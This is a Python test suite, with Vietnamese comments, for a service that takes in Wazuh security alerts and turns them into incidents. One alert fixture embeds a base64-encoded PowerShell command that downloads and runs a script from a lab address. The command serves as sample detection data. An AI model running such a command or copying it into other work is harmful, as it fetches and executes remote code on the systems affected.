# -*- coding: utf-8 -*-
"""
tests/test_webhook_receiver.py
Kiểm thử toàn diện module tiếp nhận Webhook từ Wazuh OVA.
Bao gồm:
1. Unit Tests: Xác thực Header, IP, kiểm tra Schema, lọc Rule Level, lọc Trùng lặp.
2. Integration Tests: Luồng hoàn chỉnh từ Webhook -> IngestionAgent -> StateGraphOrchestrator -> IncidentStore.
3. Concurrency Burst Tests: Gửi nhiều request đồng thời, đo thời gian phản hồi và tính toàn vẹn dữ liệu.
"""

import os
import json
import time
import shutil
import tempfile
import unittest
from concurrent.futures import ThreadPoolExecutor
from starlette.testclient import TestClient

from src.api.webhook_server import create_app, WebhookService, DEFAULT_SECRET
from src.core.incident_store import IncidentStore
from src.agents.ingestion_agent import IngestionAgent
from src.core.orchestrator import StateGraphOrchestrator
from src.core.schemas import IncidentStatus, AttackCategory


class TestWazuhWebhookReceiver(unittest.TestCase):
    """Bộ kiểm thử tính năng Webhook Ingestion từ Wazuh OVA."""

    @classmethod
    def setUpClass(cls):
        cls.test_dir = tempfile.mkdtemp(prefix="test_incidents_")
        cls.incident_store = IncidentStore(storage_dir=cls.test_dir)
        cls.ingestion_agent = IngestionAgent()
        cls.orchestrator = StateGraphOrchestrator(ingestion_agent=cls.ingestion_agent)

        cls.service = WebhookService(
            incident_store=cls.incident_store,
            ingestion_agent=cls.ingestion_agent,
            orchestrator=cls.orchestrator,
            secret_token=DEFAULT_SECRET,
            allowed_ips=["*"],  # Cho phép testclient
            min_level=7,
        )
        cls.app = create_app(cls.service)
        cls.client = TestClient(cls.app)

        cls.valid_headers = {"X-Wazuh-Secret-Token": DEFAULT_SECRET}

        cls.sample_malware_alert = {
            "id": "wazuh-test-1001",
            "timestamp": "2026-10-20T08:30:00Z",
            "rule": {
                "id": "92211",
                "level": 12,
                "description": "Suspicious PowerShell Base64 Encoded Download Detected",
                "groups": ["windows", "sysmon", "attack.t1059.001"],
                "mitre": {
                    "id": ["T1059.001"],
                    "tactic": ["Execution"],
                    "technique": ["PowerShell"]
                }
            },
            "agent": {
                "id": "002",
                "name": "WIN10-VICTIM-01",
                "ip": "172.16.65.50"
            },
            "data": {
                "win": {
                    "eventdata": {
                        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "commandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA2ADUALgAxADAAOgA4ADAAOAAwAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                        "destinationIp": "172.16.65.10",
                        "destinationPort": "8080"
                    }
                }
            },
            "full_log": "PowerShell executed encoded download Cradle."
        }

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.test_dir, ignore_errors=True)

    def setUp(self):
        self.incident_store.clear()

    # 1. Kiểm tra Health Endpoint
    def test_health_check_endpoint(self):
        res = self.client.get("/api/v1/health")
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertEqual(data["status"], "healthy")
        self.assertEqual(data["service"], "wazuh-webhook-receiver")
        self.assertEqual(data["min_rule_level"], 7)

    # 2. Kiểm tra xác thực Token hợp lệ
    def test_webhook_valid_token_returns_202_accepted(self):
        res = self.client.post(
            "/api/v1/wazuh-alert",
            json=self.sample_malware_alert,
            headers=self.valid_headers
        )
        self.assertEqual(res.status_code, 202)
        data = res.json()
        self.assertEqual(data["status"], "accepted")
        self.assertEqual(data["action_taken"], "QUEUED")
        self.assertTrue(data["incident_id"].startswith("INC-WAZUH-"))
        self.assertEqual(data["rule_level"], 12)

    # 3. Kiểm tra từ chối khi thiếu hoặc sai token
    def test_webhook_unauthorized_token(self):
        # Không truyền token
        res_no_token = self.client.post("/api/v1/wazuh-alert", json=self.sample_malware_alert)
        self.assertEqual(res_no_token.status_code, 401)
        self.assertIn("Missing", res_no_token.json().get("error", ""))

        # Truyền token sai
        res_bad_token = self.client.post(
            "/api/v1/wazuh-alert",
            json=self.sample_malware_alert,
            headers={"X-Wazuh-Secret-Token": "invalid-token-123"}
        )
        self.assertEqual(res_bad_token.status_code, 401)
        self.assertIn("Invalid", res_bad_token.json().get("error", ""))

    # 4. Kiểm tra xử lý cú pháp JSON hỏng
    def test_webhook_malformed_json_syntax(self):
        bad_json = b'{"id": "123", "rule": {"level": 12, '
        res = self.client.post(
            "/api/v1/wazuh-alert",
            content=bad_json,
            headers={"Content-Type": "application/json", **self.valid_headers}
        )
        self.assertEqual(res.status_code, 400)
        self.assertIn("Malformed JSON", res.json().get("error", ""))

    # 5. Kiểm tra lọc mức độ cảnh báo (Rule Level Threshold)
    def test_webhook_low_rule_level_dropped(self):
        low_alert = dict(self.sample_malware_alert)
        low_alert["rule"] = dict(self.sample_malware_alert["rule"])
        low_alert["rule"]["level"] = 4  # Dưới ngưỡng 7
        low_alert["rule"]["description"] = "Low severity benign activity"

        res = self.client.post(
            "/api/v1/wazuh-alert",
            json=low_alert,
            headers=self.valid_headers
        )
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertEqual(data["status"], "ignored")
        self.assertEqual(data["action_taken"], "DROPPED")

    # 6. Kiểm tra khử trùng lặp cảnh báo (Deduplication)
    def test_webhook_sliding_window_deduplication(self):
        # Lần 1: Cảnh báo mới -> Chấp nhận 202
        res1 = self.client.post(
            "/api/v1/wazuh-alert",
            json=self.sample_malware_alert,
            headers=self.valid_headers
        )
        self.assertEqual(res1.status_code, 202)

        # Lần 2: Cùng rule_id và agent_id trong vòng 30s -> Khử trùng lặp 200
        res2 = self.client.post(
            "/api/v1/wazuh-alert",
            json=self.sample_malware_alert,
            headers=self.valid_headers
        )
        self.assertEqual(res2.status_code, 200)
        data2 = res2.json()
        self.assertEqual(data2["status"], "deduplicated")
        self.assertEqual(data2["action_taken"], "SKIPPED_DUPLICATE")

    # 7. Kiểm tra định dạng lồng 'alert' của Wazuh Integrator
    def test_webhook_nested_alert_wrapper(self):
        nested_payload = {
            "integration": "custom-soc",
            "alert": self.sample_malware_alert
        }
        res = self.client.post(
            "/api/v1/wazuh-alert",
            json=nested_payload,
            headers=self.valid_headers
        )
        self.assertEqual(res.status_code, 202)
        self.assertEqual(res.json()["rule_id"], "92211")

    # 8. Kiểm thử tích hợp E2E: Webhook -> Ingestion -> StateGraph -> IncidentStore
    def test_e2e_webhook_to_incident_store_and_attack_classification(self):
        # Gửi cảnh báo Phishing / Credential Access
        phishing_alert = {
            "id": "wazuh-phish-9001",
            "timestamp": "2026-10-20T08:45:00Z",
            "rule": {
                "id": "60106",
                "level": 10,
                "description": "Windows Logon Failure - Password Spraying Detected",
                "groups": ["windows", "security", "credential_access"],
                "mitre": {"id": ["T1110.003"], "tactic": ["Credential Access"]}
            },
            "agent": {"id": "003", "name": "DC-SERVER-01", "ip": "172.16.65.20"},
            "data": {
                "win": {
                    "eventdata": {
                        "targetUserName": "administrator",
                        "ipAddress": "172.16.65.10"
                    }
                }
            },
            "full_log": "Audit failure 4625 brute force attempt."
        }

        # Gọi Webhook
        res = self.client.post(
            "/api/v1/wazuh-alert",
            json=phishing_alert,
            headers=self.valid_headers
        )
        self.assertEqual(res.status_code, 202)
        inc_id = res.json()["incident_id"]

        # Kiểm tra file sự cố được lưu trong IncidentStore
        # Note: TestClient thực thi BackgroundTasks đồng bộ trước khi response trả về
        saved_incident = self.incident_store.get_incident(inc_id)
        self.assertIsNotNone(saved_incident, "Sự cố phải được lưu trong IncidentStore")
        self.assertEqual(saved_incident.incident_id, inc_id)
        self.assertIn("172.16.65.10", str(saved_incident.parsed_events[0].source_ip or saved_incident.parsed_events[0].command_line))

        # Kiểm tra danh sách sự cố qua API GET /api/v1/incidents
        res_list = self.client.get("/api/v1/incidents")
        self.assertEqual(res_list.status_code, 200)
        incidents = res_list.json().get("incidents", [])
        self.assertTrue(any(i["incident_id"] == inc_id for i in incidents))

    # 9. Kiểm thử chịu tải nhanh (Concurrency Burst 20 requests)
    def test_concurrent_webhook_burst_requests(self):
        def send_alert(idx: int):
            payload = dict(self.sample_malware_alert)
            payload["id"] = f"burst-{idx}"
            payload["rule"] = dict(self.sample_malware_alert["rule"])
            payload["rule"]["id"] = f"990{idx}"  # Khác rule_id để không bị deduplicate
            return self.client.post(
                "/api/v1/wazuh-alert",
                json=payload,
                headers=self.valid_headers
            )

        start_time = time.perf_counter()
        with ThreadPoolExecutor(max_workers=5) as executor:
            responses = list(executor.map(send_alert, range(20)))
        elapsed = time.perf_counter() - start_time

        # Kiểm tra 100% request thành công 202 Accepted
        status_codes = [r.status_code for r in responses]
        self.assertEqual(status_codes.count(202), 20)
        self.assertLess(elapsed, 10.0, "Thời gian xử lý 20 requests phải dưới 10 giây")


if __name__ == "__main__":
    unittest.main()
